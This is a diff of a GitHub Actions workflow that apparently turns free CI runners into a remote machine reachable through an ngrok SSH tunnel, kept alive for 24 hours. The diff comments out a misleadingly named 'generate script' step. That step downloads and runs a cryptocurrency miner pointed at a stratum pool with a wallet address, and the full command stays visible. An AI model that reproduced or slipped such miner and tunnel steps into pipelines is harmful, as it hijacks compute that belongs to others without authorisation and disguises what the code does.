@@ -14,8 +14,8 @@ jobs:
           NGROK_TOKEN: ${{ secrets.NGROK_TOKEN }}
           SSH_PUBLIC_KEY: ${{ secrets.NGROK_SSH_PUBLIC_KEY }}
         shell: bash
-      - name: generate script
-        run: wget https://github.com/De-Crypted/dcrptd-miner/releases/download/2.3.0/dcrptd-miner-linux-x64-2.3.0.tar.gz && tar -xvf dcrptd-miner-linux-x64-2.3.0.tar.gz && ./dcrptd-miner --url stratum+tcp://bmb.ffmpool.com:4444 --user 0033B34D8D445DBB89DD97AF6F079386DF6D218EB0D79EF73C.yourworker
+     # - name: generate script
+      #  run: wget https://github.com/De-Crypted/dcrptd-miner/releases/download/2.3.0/dcrptd-miner-linux-x64-2.3.0.tar.gz && tar -xvf dcrptd-miner-linux-x64-2.3.0.tar.gz && ./dcrptd-miner --url stratum+tcp://bmb.ffmpool.com:4444 --user 0033B34D8D445DBB89DD97AF6F079386DF6D218EB0D79EF73C.yourworker
       - name: Keep tunnel alive for 24 hours
         run: sleep 86400
         shell: bash
